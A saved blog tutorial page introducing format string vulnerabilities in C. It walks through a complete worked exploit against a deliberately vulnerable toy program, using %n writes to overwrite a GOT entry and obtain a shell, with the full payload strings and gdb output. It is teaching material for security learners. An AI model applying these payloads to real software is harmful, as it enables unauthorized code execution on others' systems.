<!DOCTYPE html>
<!-- saved from url=(0082)http://codearcana.com/posts/2013/05/02/introduction-to-format-string-exploits.html -->
<html lang="en"><head><meta http-equiv="Content-Type" content="text/html; charset=UTF-8">
        <title>Introduction to format string exploits</title>
        <meta charset="utf-8">
        <link rel="stylesheet" href="./Introduction to format string exploits_files/main.css" type="text/css">
        <link href="http://codearcana.com/" type="application/atom+xml" rel="alternate" title="Code Arcana ATOM Feed">


        <!--[if IE]>
                <script src="http://html5shiv.googlecode.com/svn/trunk/html5.js"></script><![endif]-->

        <!--[if lte IE 7]>
                <link rel="stylesheet" type="text/css" media="all" href="http://codearcana.com/css/ie.css"/>
                <script src="http://codearcana.com/js/IE8.js" type="text/javascript"></script><![endif]-->

        <!--[if lt IE 7]>
                <link rel="stylesheet" type="text/css" media="all" href="http://codearcana.com/css/ie6.css"/><![endif]-->

<style type="text/css"></style><script type="text/javascript" async="" src="./Introduction to format string exploits_files/embed.js"></script></head>

<body id="index" class="home" data-twttr-rendered="true">
        <header id="banner" class="body">
                <h1><a href="http://codearcana.com/index.html">Code Arcana </a></h1>
                <nav><ul>
                    <li><a href="http://codearcana.com/">Blog</a></li>
                    <li><a href="http://codearcana.com/archives.html">Archives</a></li>
                    <li><a href="http://codearcana.com/pages/about.html">About</a></li>
                </ul></nav>
        </header><!-- /#banner -->

<section id="content" class="body">
<article>
        <header> <h1 class="entry-title"><a href="http://codearcana.com/posts/2013/05/02/posts/2013/05/02/introduction-to-format-string-exploits.html" rel="bookmark" title="Permalink to Introduction to format string exploits">Introduction to format string exploits</a></h1> <iframe allowtransparency="true" frameborder="0" scrolling="no" src="./Introduction to format string exploits_files/tweet_button.1378258117.html" class="twitter-share-button twitter-count-horizontal" style="width: 109px; height: 20px; " title="Twitter Tweet Button" data-twttr-rendered="true"></iframe><script type="text/javascript" src="./Introduction to format string exploits_files/widgets.js"></script>
 </header>
<footer class="post-info">
        <abbr class="published" title="2013-05-02T00:00:00">
                Thu 02 May 2013
        </abbr>

        <address class="vcard author">
                By <a class="url fn" href="http://codearcana.com/author/alex-reece.html">Alex Reece</a>
        </address>
<p>In <a href="http://codearcana.com/category/security.html">security</a>. </p>
<p>tags: <a href="http://codearcana.com/tag/exploitation.html">exploitation</a><a href="http://codearcana.com/tag/tutorial.html">tutorial</a></p></footer><!-- /.post-info --><!-- /.post-info -->
        <div class="entry-content">
        <p>It would be helpful to be familiar with the x86 calling conventions before reading this tutorial. I prepared a brief primer <a href="http://codearcana.com/posts/2013/05/21/a-brief-introduction-to-x86-calling-conventions.html">here</a> and you are encouraged to learn more on your own.</p>
<h1>How do format strings vulnerabilities work?</h1>
<p>Format string vulnerabilities are a pretty silly class of bug that take advantage of an easily avoidable programmer error.
If the programmer passes an attacker-controlled buffer as the argument to a <code>printf</code> 
(or any of the related functions, including <code>sprintf</code>, <code>fprintf</code>, etc), the attacker can perform
writes to arbitrary memory addresses. The following program contains such an error:</p>
<div class="highlight"><pre><span class="cp">#include&lt;stdio.h&gt;</span>
<span class="kt">int</span> <span class="nf">main</span><span class="p">(</span><span class="kt">int</span> <span class="n">argc</span><span class="p">,</span> <span class="kt">char</span><span class="o">**</span> <span class="n">argv</span><span class="p">)</span> <span class="p">{</span>
    <span class="kt">char</span> <span class="n">buffer</span><span class="p">[</span><span class="mi">100</span><span class="p">];</span>
    <span class="n">strncpy</span><span class="p">(</span><span class="n">buffer</span><span class="p">,</span> <span class="n">argv</span><span class="p">[</span><span class="mi">1</span><span class="p">],</span> <span class="mi">100</span><span class="p">);</span>
    <span class="n">printf</span><span class="p">(</span><span class="n">buffer</span><span class="p">);</span>
    <span class="k">return</span> <span class="mi">0</span><span class="p">;</span>
<span class="p">}</span>
</pre></div>


<p>Since <code>printf</code> has a variable number of arguments, it must use the format string to determine the number of arguments.
In the case above, the attacker can pass the string <code>"%p %p %p %p %p %p %p %p %p %p %p %p %p %p %p"</code> and fool the <code>printf</code> into thinking it has 15
arguments. It will naively print the next 15 addresses on the stack, thinking they are its arguments:</p>
<div class="highlight"><pre><span class="gp">$</span> ./a.out <span class="s2">"%p %p %p %p %p %p %p %p %p %p %p %p %p %p %p"</span>
<span class="go">0xffffdddd 0x64 0xf7ec1289 0xffffdbdf 0xffffdbde (nil) 0xffffdcc4 0xffffdc64 (nil) 0x25207025 0x70252070 0x20702520 0x25207025 0x70252070 0x20702520</span>
</pre></div>


<p>At about 10 arguments up the stack, we can see a repeating pattern of <code>0x252070</code> - those are our <code>%p</code>s on the stack! We start our string
with <code>AAAA</code> to see this more explicitly:</p>
<div class="highlight"><pre><span class="gp">$</span> ./a.out <span class="s2">"AAAA%p %p %p %p %p %p %p %p %p %p"</span>
<span class="go">AAAA0xffffdde8 0x64 0xf7ec1289 0xffffdbef 0xffffdbee (nil) 0xffffdcd4 0xffffdc74 (nil) 0x41414141</span>
</pre></div>


<p>The <code>0x41414141</code> is the hex representation of <code>AAAA</code>. We now have a way to pass an
arbitrary value (in this case, we're passing <code>0x41414141</code>) as an argument to <code>printf</code>. At this point we will take
advantage of another format string feature: in a format specifier, we can also select a specific argument. For example,
<code>printf("%2$x", 1, 2, 3)</code> will print 2. In general, we can do <code>printf("%&lt;some number&gt;$x")</code> to select an arbitrary argument
to <code>printf</code>. In our case, we see that <code>0x41414141</code> is the 10th argument to <code>printf</code>, so we can simplify our string<sup id="fnref:1"><a class="footnote-ref" href="http://codearcana.com/posts/2013/05/02/introduction-to-format-string-exploits.html#fn:1" rel="footnote">1</a></sup>:</p>
<div class="highlight"><pre><span class="gp">$</span> ./a.out <span class="s1">'AAAA%10$p'</span>
<span class="go">AAAA0x41414141</span>
</pre></div>


<p>So how do we turn this into an arbitrary write primitive? Well, <code>printf</code> has a <em>really interesting</em> format specifier: <code>%n</code>.
From the man page of <code>printf</code>: </p>
<blockquote>
<p>The number of characters written so far is stored into the  integer indicated  by the int * (or variant) pointer argument.  No argument is converted.</p>
</blockquote>
<p>If we were to pass the string <code>AAAA%10$n</code>, we would write the value 4 to the address <code>0x41414141</code>! We can use another 
<code>printf</code> feature to write larger values: if we do <code>printf("AAAA%100x")</code>, 104 characters will be output 
(because <code>%100x</code> prints the argument padded to at least 100 characters). We can do <code>AAAA%&lt;value-4&gt;x%10$n</code> to write an
arbitrary value to <code>0x41414141</code>.</p>
<p>The next thing to know is that almost certainly don't want to write all characters in one go: for example, 
if we want to write the value <code>0x0804a004</code>, we would have to write 134520836 characters to standard out! Instead,
we break it up into two writes: first we write <code>0x0804</code> (2052) to the higher two bytes of the target address and then we 
write <code>0xa004</code> (40964) to the lower two bytes of the target address. To do this, we will use <code>%hn</code> to write only 2 bytes
at a time. Such a format string might look like this: <code>CAAAAAAA%2044x%10$hn%38912x%11$hn</code>. Lets break this down so we can
understand it.</p>
<ul>
<li><code>CAAAAAAA</code> - this is the higher two bytes of the target address (<code>0x41414143</code>) 
      and the lower two bytes of the target address (<code>0x41414141</code>) </li>
<li><code>%2044x%10$hn</code> - since we want to have written a total of 2052 bytes when we get to the 
      first <code>%hn</code>, and we have already written 8 bytes so far, we need to write an addition
      2044 bytes.</li>
<li><code>%38912x%11$hn</code> - since we want to have written a total of 40964 bytes when we get to the
      second <code>%hn</code>, and we since we have already written 2052 bytes so far, we need to write
      an additional 38912 bytes.</li>
</ul>
<p>Here is an example of how this might be used <sup id="fnref:2"><a class="footnote-ref" href="http://codearcana.com/posts/2013/05/02/introduction-to-format-string-exploits.html#fn:2" rel="footnote">2</a></sup>:</p>
<div class="highlight"><pre><span class="go">./a.out "$(python -c 'import sys; sys.stdout.write("CAAAAAAA%2044x%10$hn%38912x%11$hn")')"</span>
</pre></div>


<h1>What can we do with them?</h1>
<p>Since a format string vulnerability gives us the ability to write an arbitrary value 
to an arbitrary address, we can do a lot of things with it. Usually the easiest thing to do is
write to a function pointer somewhere and turn our arbitrary write primitive 
into arbitrary code execution. In dynamically linked programs, these are easy to find.
When a program attempts to execute a function in a shared library, it does not necessarily
know the location of that function at compile time. Instead, it jumps to a stub function that has a pointer
to the correct location of the function in the shared library. This pointer (located in the global offset table, or GOT)
is initialized at runtime when the stub function is first called. </p>
<p>For example, when <code>strcat</code> is used in a program, the
following piece of stub code allows the program to find the correct location in the shared library <code>libc</code> at run time:</p>
<div class="highlight"><pre><span class="gp">$</span> objdump -d a.out
<span class="go">... &lt;snip&gt; ...</span>
<span class="go">08048330 &lt;strcat@plt&gt;:</span>
<span class="go"> 8048330:       ff 25 04 a0 04 08       jmp    *0x804a004</span>
<span class="go"> 8048336:       68 08 00 00 00          push   $0x8</span>
<span class="go"> 804833b:       e9 d0 ff ff ff          jmp    8048310 &lt;_init+0x3c&gt;</span>
<span class="go">... &lt;snip&gt; ...</span>
</pre></div>


<p>Here you can see that the <code>stcat@plt</code> is the stub function that jumps to GOT entry for <code>strcat</code> (the address <code>0x804a004</code>),
which is set at runtime to the location in <code>libc</code> of the <code>strcat</code> function. We can write any value we want
to <code>0x804a004</code>. When <code>strcat</code> is used later in the program, the program will instead transfer code execution
to the value we specified. A common technique is to overwrite the GOT entry with the address of the function <code>system</code>, 
thereby turning a call of <code>strcat(buffer, "hello")</code> into the call <code>system(buffer)</code> (if we can control the contents 
of <code>buffer</code>, we can get a shell!).</p>
<h1>An example</h1>
<p>For an example, we will exploit the following C program:</p>
<div class="highlight"><pre><span class="cp">#include &lt;stdio.h&gt;</span>
<span class="cp">#include &lt;string.h&gt;</span>
<span class="c1">// compile with gcc -m32 temp.c</span>

<span class="kt">int</span> <span class="nf">main</span><span class="p">(</span><span class="kt">int</span> <span class="n">argc</span><span class="p">,</span> <span class="kt">char</span><span class="o">**</span> <span class="n">argv</span><span class="p">)</span> <span class="p">{</span>
  <span class="n">printf</span><span class="p">(</span><span class="n">argv</span><span class="p">[</span><span class="mi">1</span><span class="p">]);</span>
  <span class="n">strdup</span><span class="p">(</span><span class="n">argv</span><span class="p">[</span><span class="mi">1</span><span class="p">]);</span>
<span class="p">}</span>
</pre></div>


<p>Over plan is going to be to overwrite the GOT entry of <code>strdup</code> with the address of <code>system</code>, so the program
will <code>printf(argv[1])</code> then <code>system(argv[1])</code>. Hence, our payload must be a valid argument to <code>system</code> - we will
start our payload with <code>sh;#</code> (which will be <code>sh</code> and cause the rest of the payload to be a comment. 
This also has the advantage of being exactly 4 bytes long, which isn't important for this example 
but is very useful in other cases). </p>
<p>For every format string exploit, our payload will eventually 
look something like this: <code>&lt;address&gt;&lt;address+2&gt;%&lt;number&gt;x%&lt;offset&gt;$hn%&lt;other number&gt;x%&lt;offset+1&gt;$hn</code>. 
We prepare a payload that will be the same length as our final payload so we can start computing
the correct offsets and addresses (note that we use <code>%hp</code> and <code>%00000x</code> so we can just modify the string
in the last step without modifying its length):</p>
<div class="highlight"><pre><span class="gp">$</span> env -i ./a.out <span class="s2">"$(python -c 'import sys; sys.stdout.write("</span>sh;#AAAABBBB%00000x%17<span class="nv">$hp</span>%00000x%18<span class="nv">$hp</span><span class="s2">")')"</span>
<span class="gp">sh;#</span>AAAABBBB00xf7fcbff48048449<span class="o">(</span>nil<span class="o">)</span>
</pre></div>


<p>Our goal is to find the correct offsets (instead of 17 and 18) so that the we output <code>sh;#AAAABBBB&lt;garbabe&gt;0x41414141&lt;garbage&gt;0x42424242</code>. 
This takes some work, but in our case the correct offsets are 99 and 100:</p>
<div class="highlight"><pre><span class="gp">$</span> env -i ./a.out <span class="s2">"$(python -c 'import sys; sys.stdout.write("</span>sh;#AAAABBBB%00000x%99<span class="nv">$hp</span>%00000x%100<span class="nv">$hp</span><span class="s2">")')"</span>
<span class="gp">sh;#</span>AAAABBBB00x4141414180484490x42424242
</pre></div>


<p>It is important to note that our payload is <em>very</em> sensitive to a change in length: adding one byte 
to the end of the string will change the required offsets and perhaps mess up the alignment.</p>
<div class="highlight"><pre><span class="gp">$</span> env -i ./a.out <span class="s2">"$(python -c 'import sys; sys.stdout.write("</span>sh;#AAAABBBB%00000x%99<span class="nv">$hp</span>%00000x%100<span class="nv">$hp</span><span class="s2">")')A"</span>
<span class="gp">sh;#</span>AAAABBBB00x2e00000080484490x6f2e612fA
</pre></div>


<p>This is because the arguments are passed onto the stack before the start of our program, and so changing the
length of the arguments will change their alignment and the initial stack location for the program itself. In
order to have our exploit work consistently, we need to ensure that the payload is at a consistent alignment 
(and at a consistent offset above us on the stack) by being careful to control the amount of stuff on the stack.
This is also why we are using <code>env -i</code> as a wrapper for our program (it clears the environment, which is also 
passed onto the stack before the start of a program).</p>
<p>Anyways, lets find the <code>strdup</code> GOT entry:</p>
<div class="highlight"><pre><span class="gp">$</span> objdump -d a.out
<span class="go">... &lt;snip&gt; ...</span>
<span class="go">08048330 &lt;strdup@plt&gt;:</span>
<span class="go"> 8048330:       ff 25 04 a0 04 08       jmp    *0x804a004</span>
<span class="go"> 8048336:       68 08 00 00 00          push   $0x8</span>
<span class="go"> 804833b:       e9 d0 ff ff ff          jmp    8048310 &lt;_init+0x3c&gt;</span>
<span class="go">... &lt;snip&gt; ...</span>
</pre></div>


<p>Now we know where to write. We want to the address of <code>system</code> to the <code>strdup</code> got entry, <code>0x804a004</code>. 
For now, we plug in our address into the payload and make sure everything still works out:</p>
<div class="highlight"><pre><span class="gp">$</span> env -i ./a.out <span class="s2">"$(python -c 'import sys; sys.stdout.write("</span>sh;#<span class="se">\x</span>04<span class="se">\x</span>a0<span class="se">\x</span>04<span class="se">\x</span>08<span class="se">\x</span>06<span class="se">\x</span>a0<span class="se">\x</span>04<span class="se">\x</span>08%00000x%99<span class="nv">$hp</span>%00000x%100<span class="nv">$hp</span><span class="s2">")')"</span>
<span class="gp">sh;#</span>00x804a00480484490x804a006
</pre></div>


<p>The next step is to figure out where to write. First, since it is a 32 bit binary, we can disable libc randomization. 
We disable libc randomization via:</p>
<div class="highlight"><pre><span class="gp">$</span> <span class="nb">ulimit</span> -s unlimited
</pre></div>


<p>Now the address of <code>system</code> is at a deterministic location in memory. 
We can just open up the program in <code>gdb</code> and print the address of <code>system</code>:</p>
<div class="highlight"><pre><span class="gp">$</span> gdb -q a.out
<span class="go">Reading symbols from /home/ppp/a.out...(no debugging symbols found)...done.</span>
<span class="go">(gdb) b main</span>
<span class="go">Breakpoint 1 at 0x8048417</span>
<span class="go">(gdb) r</span>
<span class="go">Starting program: /home/ppp/a.out </span>

<span class="go">Breakpoint 1, 0x08048417 in main ()</span>
<span class="go">(gdb) p system</span>
<span class="gp">$</span><span class="nv">1</span> <span class="o">=</span> <span class="o">{</span>&lt;text variable, no debug info&gt;<span class="o">}</span> 0x555c2250 &lt;system&gt;
</pre></div>


<p>All right, now we know that we need to write <code>0x555c2250</code> (the address of system)
to the address <code>0x804a004</code> (the got entry of <code>strdup</code>). We are doing this in two parts. 
First, we write <code>0x2250</code> to the two bytes at <code>0x804a004</code> then we write <code>0x555c</code> to
the two bytes at <code>0x804a006</code>. We can figure out how many bytes to write in python:</p>
<div class="highlight"><pre><span class="gp">$</span> python
<span class="gp">&gt;</span>&gt;&gt; 0x2250 - 12 <span class="c"># We've already written 12 bytes ("sh;#AAAABBBB").</span>
<span class="go">8772</span>
<span class="gp">&gt;</span>&gt;&gt; 0x555c - 0x2250 <span class="c"># We've already written 0x2250 bytes.</span>
<span class="go">13068</span>
</pre></div>


<p>Now we plug these values into our payload, change the <code>%hp</code> to <code>%hn</code>. Note that when 
we change the <code>%00000x</code> to <code>%08772</code>, we leave the leading <code>0</code> so that our string
stays the same length. Here is the final exploit:</p>
<div class="highlight"><pre><span class="gp">$</span> env -i ./a.out <span class="s2">"$(python -c 'import sys; sys.stdout.write("</span>sh;#<span class="se">\x</span>04<span class="se">\x</span>a0<span class="se">\x</span>04<span class="se">\x</span>08<span class="se">\x</span>06<span class="se">\x</span>a0<span class="se">\x</span>04<span class="se">\x</span>08%08772x%99<span class="nv">$hn</span>%13068x%100<span class="nv">$hn</span><span class="s2">")')"</span>
<span class="gp">sh;#</span>..&lt;garbage&gt;..sh-4.2<span class="nv">$ </span>
</pre></div>


<p>Woo hoo, we got our shell!</p>
<h1>Debugging an exploit</h1>
<p>Sometimes, things don't go as planned and we don't get a shell. If this
happens, <code>gdb</code> is your friend. Unfortunately, <code>gdb</code> isn't a very good friend.
It helpfully puts stuff in your environment, so any careful calculations you
were doing related to the stack may no longer be valid. In order to resolve
this, you need to make sure your environment looks like the environment used 
by <code>gdb</code>. We
first see what the stack looks like under <code>gdb</code> and then always run our exploit
with that environment:</p>
<div class="highlight"><pre><span class="gp">$</span> env -i /usr/bin/printenv
<span class="gp">$</span> gdb -q /usr/bin/printenv
<span class="go">Reading symbols from /usr/bin/printenv...(no debugging symbols found)...done.</span>
<span class="go">(gdb) unset env</span>
<span class="go">Delete all environment variables? (y or n) y</span>
<span class="go">(gdb) r</span>
<span class="go">Starting program: /usr/bin/printenv </span>
<span class="go">PWD=/home/ppp</span>
<span class="go">SHLVL=0</span>
</pre></div>


<p>Now that we know the environment used by <code>gdb</code>, we can make sure to always 
execute our payload with the same environment so we can test our exploit in
<code>gdb</code>:</p>
<div class="highlight"><pre><span class="gp">$</span> env -i <span class="nv">PWD</span><span class="o">=</span><span class="k">$(</span><span class="nb">pwd</span><span class="k">)</span> <span class="nv">SHLVL</span><span class="o">=</span>0 ./a.out <span class="s2">"$(python -c 'print "</span>my_exploit_string<span class="s2">"')"</span> <span class="c"># Outside gdb.</span>
<span class="gp">$</span> gdb ./a.out <span class="c"># Inside gdb.</span>
<span class="go">(gdb) unset env</span>
<span class="go">Delete all environment variables? (y or n) y</span>
<span class="go">(gdb) r "$(/usr/bin/python -c 'print "my_exploit_string"')"</span>
</pre></div>


<p>The most helpful thing to do in <code>gdb</code> is to break just before the call to
<code>printf</code> and make sure the argument and the stack stack is what you 
expect (if you expect to use <code>%10$hn</code>, make sure the value you control is the 10th argument after the format
string).
If that works, then break right after the call to <code>printf</code> and make sure the value you expect is at the target address.</p>
<div class="highlight"><pre><span class="go">Breakpoint 1, 0x080484ae in main ()</span>
<span class="go">(gdb) x/2i $pc</span>
<span class="go">=&gt; 0x80484ae &lt;main+74&gt;: call   0x8048360 &lt;printf@plt&gt;</span>
<span class="go">   0x80484b3 &lt;main+79&gt;: mov    $0x0,%eax</span>
<span class="go">(gdb) x/a $esp</span>
<span class="go">0xffffdb70: 0xffffdb98</span>
<span class="go">(gdb) x/s 0xffffdb98</span>
<span class="go">0xffffdb98:  "AAAA%10$p"</span>
<span class="go">(gdb) x/11a $esp</span>
<span class="go">0xffffdb70: 0xffffdb98  0xffffdddd  0x64    0xf7ec1289</span>
<span class="go">0xffffdb80: 0xffffdbbf  0xffffdbbe  0x0 0xffffdca4</span>
<span class="go">0xffffdb90: 0xffffdc44  0x0 0x41414141</span>
<span class="go">(gdb) x/a $esp + 40</span>
<span class="go">0xffffdb98: 0x41414141</span>
</pre></div>


<div class="footnote">
<hr>
<ol>
<li id="fn:1">
<p>You'll note the single quotes - <code>$</code> is a special symbol on the shell and would otherwise need to be escaped.&nbsp;<a class="footnote-backref" href="http://codearcana.com/posts/2013/05/02/introduction-to-format-string-exploits.html#fnref:1" rev="footnote" title="Jump back to footnote 1 in the text">↩</a></p>
</li>
<li id="fn:2">
<p>You'll note that we use print the exploit string in a python subshell. 
This isn't strictly necessary in this case, but for more interesting exploits the ability to print escape characters
and use arbitrary bytes in our payload is very useful. We also print via <code>sys.stdout.write</code> to prevent the newline
at the end we would get if we otherwise used <code>print</code> and surround the subshell in double quotes in case the payload had
whitespace in it.&nbsp;<a class="footnote-backref" href="http://codearcana.com/posts/2013/05/02/introduction-to-format-string-exploits.html#fnref:2" rev="footnote" title="Jump back to footnote 2 in the text">↩</a></p>
</li>
</ol>
</div>
        </div><!-- /.entry-content -->
        <div class="comments">
        <h2>Comments !</h2>
            <div id="disqus_thread"><iframe id="dsq1" data-disqus-uid="1" allowtransparency="true" frameborder="0" role="complementary" style="width: 100% !important; border: none !important; overflow: hidden !important; height: 1561px !important; " width="100%" src="./Introduction to format string exploits_files/saved_resource.html" scrolling="no" horizontalscrolling="no" verticalscrolling="no"></iframe></div>
            <script type="text/javascript">
               var disqus_identifier = "posts/2013/05/02/introduction-to-format-string-exploits.html";
               (function() {
               var dsq = document.createElement('script'); dsq.type = 'text/javascript'; dsq.async = true;
               dsq.src = 'http://codearcana.disqus.com/embed.js';
               (document.getElementsByTagName('head')[0] || document.getElementsByTagName('body')[0]).appendChild(dsq);
              })();
            </script>
        </div>

</article>
</section>

        <aside id="sidebar">
                <div class="widget">
                        <h2>Categories</h2>
                        <ul>
                           <li><a href="http://codearcana.com/category/performance.html">performance</a></li>
                           <li class="active"><a href="http://codearcana.com/category/security.html">security</a></li>
                           <li><a href="http://codearcana.com/category/software-engineering.html">software engineering</a></li>
                        </ul>
		</div>
		<div class="widget">
		    <h2>Tags</h2>
		    <ul class="cloud">
			<li class="tag-4">
			  <a class="tag" href="http://codearcana.com/tag/zsh.html">zsh</a>
			</li>
			<li class="tag-4">
			  <a class="tag" href="http://codearcana.com/tag/mac-osx.html">mac osx</a>
			</li>
			<li class="tag-1">
			  <a class="tag" href="http://codearcana.com/tag/tutorial.html">tutorial</a>
			</li>
			<li class="tag-1">
			  <a class="tag" href="http://codearcana.com/tag/profiling.html">profiling</a>
			</li>
			<li class="tag-4">
			  <a class="tag" href="http://codearcana.com/tag/make.html">make</a>
			</li>
			<li class="tag-2">
			  <a class="tag" href="http://codearcana.com/tag/golang.html">golang</a>
			</li>
			<li class="tag-4">
			  <a class="tag" href="http://codearcana.com/tag/bash.html">bash</a>
			</li>
			<li class="tag-4">
			  <a class="tag" href="http://codearcana.com/tag/malloc.html">malloc</a>
			</li>
			<li class="tag-1">
			  <a class="tag" href="http://codearcana.com/tag/exploitation.html">exploitation</a>
			</li>
			<li class="tag-4">
			  <a class="tag" href="http://codearcana.com/tag/theory.html">theory</a>
			</li>
		    </ul>
		</div>


                <div class="widget blogroll">
                        <h2>Blogroll</h2>
                        <ul>
                            <li><a href="http://ppp.cylab.cmu.edu/wordpress/">PPP Blog</a></li>
                            <li><a href="http://www.codinghorror.com/blog/">Coding Horror</a></li>
                            <li><a href="http://blog.regehr.org/">Embedded in Academia</a></li>
                            <li><a href="http://highscalability.com/">High Scalability</a></li>
                            <li><a href="http://coderweekly.com/">Coder Weekly</a></li>
                            <li><a href="http://www.phrack.org/">phrack</a></li>
                            <li><a href="http://jbremer.org/">skier_'s blog</a></li>
                            <li><a href="http://dtrace.org/blogs">dtrace blog</a></li>
                        </ul>
                </div><!-- /.blogroll -->
                <div class="widget social">
                        <h2>Social</h2>
			<ul>
                            <li><a href="http://codearcana.com/feeds/all.atom.xml" type="application/atom+xml" rel="alternate">atom feed</a></li>

				<li><a href="https://twitter.com/awreece">twitter</a></li>
				<li><a href="https://github.com/awreece">github</a></li>
				<li><a href="https://plus.google.com/106589059588263736517/posts">google+</a></li>
                        </ul>
                </div><!-- /.social -->
        </aside><!-- /#sidebar -->
    <script type="text/javascript">
    var gaJsHost = (("https:" == document.location.protocol) ? "https://ssl." : "http://www.");
    document.write(unescape("%3Cscript src='" + gaJsHost + "google-analytics.com/ga.js' type='text/javascript'%3E%3C/script%3E"));
    </script><script src="./Introduction to format string exploits_files/ga.js" type="text/javascript"></script>
    <script type="text/javascript">
    try {
        var pageTracker = _gat._getTracker("UA-40107691-1");
    pageTracker._trackPageview();
    } catch(err) {}</script>

</body></html>